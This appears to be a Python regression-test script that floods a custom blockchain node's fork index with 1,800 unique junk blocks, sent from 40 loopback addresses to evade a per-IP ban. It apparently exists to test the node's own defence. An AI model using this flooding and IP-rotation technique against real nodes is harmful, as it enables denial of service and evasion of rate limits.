#!/usr/bin/env python3
# V1 regression attacker: fill the fork index with UNIQUE cheap junk from many
# source IPs of ONE /24 (127.0.0.0/24), evading the per-IP ban.
import socket,struct,sys,json,time
MAGIC=0x534F5354
def frame(c,p=b''): return struct.pack('<I',MAGIC)+c+struct.pack('<I',len(p))+p
gi=[0]
def send_forks(host,port,gen,base,n,src_ip):
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try: s.bind((src_ip,0))
    except OSError: pass
    s.settimeout(10)
    try: s.connect((host,port))
    except OSError: return 0
    s.sendall(frame(b'VERS',struct.pack('<q',500)+bytes.fromhex(gen)))
    time.sleep(0.3)
    sent=0
    for _ in range(n):
        gi[0]+=1
        b=dict(base)
        b['block_id']=('%08x'%gi[0])+base['block_id'][8:]   # GLOBALLY unique id
        b['timestamp']=base['timestamp']+gi[0]
        b['height']=base['height']+1
        try: s.sendall(frame(b'BLCK',json.dumps(b,separators=(',',':')).encode())); sent+=1
        except OSError: break
    time.sleep(0.2); s.close()
    return sent
host,port,gen,base_json=sys.argv[1],int(sys.argv[2]),sys.argv[3],sys.argv[4]
base=json.load(open(base_json))
tot=0
for k in range(2,42):   # 40 IPs of 127.0.0.0/24 × 45 = 1800 unique forks
    tot+=send_forks(host,port,gen,base,45,'127.0.0.%d'%k)
    time.sleep(0.03)
print(json.dumps({'attacker_sent':tot,'attacker_subnet':'127.0.0.0/24'}))
